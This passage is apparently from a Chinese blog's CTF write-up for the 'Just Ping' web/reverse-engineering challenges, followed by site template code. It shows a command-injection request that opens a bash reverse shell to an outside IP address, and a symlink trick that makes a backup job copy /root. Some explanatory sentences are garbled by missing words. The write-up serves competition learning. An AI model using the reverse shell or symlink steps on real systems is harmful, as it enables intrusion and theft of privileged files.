class="line">               const data = await response.text();</span><br><span class="line">               output.textContent = data;</span><br><span class="line">               scrollToBottom();</span><br><span class="line">           } catch (error) {</span><br><span class="line">               output.textContent = `错误: ${error.message}`;</span><br><span class="line">               scrollToBottom();</span><br><span class="line">           } finally {</span><br><span class="line">               testApiButton.disabled = false;</span><br><span class="line">               targetInput.disabled = false;</span><br><span class="line">           }</span><br><span class="line">       });</span><br></pre></td></tr></tbody></table></figure>
+
+<p> testDevelopApi 会 Pool Get 和 Pool Put，初始 Pool 中的为  Plain Text ping  ，当⽤ <code>/api/testDevelopApi</code>  多次请求，把 Pool 中的对象全部⽤尽，ping 的时候就会使⽤之前传的对象</p>
+<p>在经过偶然性的测试发现，在<code>testDevelopApi</code>里输入的命令，到<code>ping</code>里面会执行</p>
+<p>这里就猜测，<code>testDevelopApi</code>接收的命令会覆盖掉<code>ping</code>里面的预置命令，这个命令就类似下面这种</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec.Command("ping","-c","4" ip)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以发现两个api共享同⼀个命令字符串pool  ，复⽤  对象 在⽹⻚端可以看到调⽤  这个 api 有回显，由于pool被复⽤，调⽤  后，⽹⻚端点击开始，  的命令可能被  的 api 复⽤，进⽽被执⾏ cmd 限制四段参数，所以⽤ bash -c 绕过限制，反弹 shell </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/testDevelopApi?cmd={{urlenc(bash -c 'bash -i &gt;&amp; /dev/tcp/47.104.232.51/7777 0&gt;&amp;1' &gt;)}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p> 多发送⼏次请求后，⽹⻚点击 开始Ping</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/15392dbd084f42f398e23933c809f367.png"></p>
+<hr>
+<h3 id="WEB-RE-Just-Ping-Part-2"><a href="#WEB-RE-Just-Ping-Part-2" class="headerlink" title="[WEB+RE]Just Ping Part 2"></a>[WEB+RE]Just Ping Part 2</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/etc/</span><br><span class="line">mkdir test</span><br><span class="line">mv backup test</span><br><span class="line">ln -s test/backup backup</span><br><span class="line">echo '/root'&gt;backupList</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<ol>
+<li><p><strong>切换目录</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/etc/</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>切换到<code>/usr/local/etc/</code>目录（通常用于存放本地安装的程序配置文件）。</li>
+</ul>
+</li>
+<li><p><strong>创建目录</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir test</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>在当前目录下创建名为<code>test</code>的新目录。</li>
+</ul>
+</li>
+<li><p><strong>移动文件 / 目录</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv backup test</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>将当前目录下的<code>backup</code>文件（或目录）移动到<code>test</code>目录中，变为<code>test/backup</code>。</li>
+<li>若<code>backup</code>原本存在，会被移入<code>test</code>目录；若不存在，此命令会报错。</li>
+</ul>
+</li>
+<li><p><strong>创建符号链接</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s test/backup backup</span><br></pre></td></tr></tbody></table></figure>
+
+<p>创建名为<code>backup</code>的符号链接（软链接），指向<code>test/backup</code>。</p>
+<ul>
+<li>此时，访问<code>backup</code>等同于访问<code>test/backup</code>。</li>
+</ul>
+</li>
+<li><p><strong>写入文件</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo '/root'&gt;backupList</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>将字符串<code>/root</code>写入到当前目录下的<code>backupList</code>文件中（若文件不存在则创建，存在则覆盖）。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<p>读取  中的⽂件路径，将对应⽂件备份到  中 ，可以看到 backupList etc ⽂件没有写权限，但是  路径下任意可读可写可执⾏ backup <code>/usr/local/etc/next</code> 那么可以将  移动到  ⽂件夹中 <code>/usr/local/etc backup</code> 并在  下创建  的符号链接，并创建  backup </p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8615b6ccbd0cee4c007941a07c1866f6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f84ec755223dafaa3f1d802821bdd8b5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/08ffa03e8e4ec2eb31352e7040586ac7.png"></p>
+<hr>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2025/05/18/h-nctf/">http://example.com/2025/05/18/h-nctf/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">q1n9</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/ctf/">
+                                    <span class="chip bg-color">ctf</span>
+                                </a>
+                            
+                                <a href="/tags/wp/">
+                                    <span class="chip bg-color">wp</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2025/05/18/d-3ctf/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="D^3ctf">
+                        
+                        <span class="card-title">D^3ctf</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-05-18
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            q1n9
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/05/18/byu/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="byuctf">
+                        
+                        <span class="card-title">byuctf</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-05-18
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            q1n9
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2025</span>
+            
+            <a href="/about" target="_blank">q1n9</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">7.4k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1625684832" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
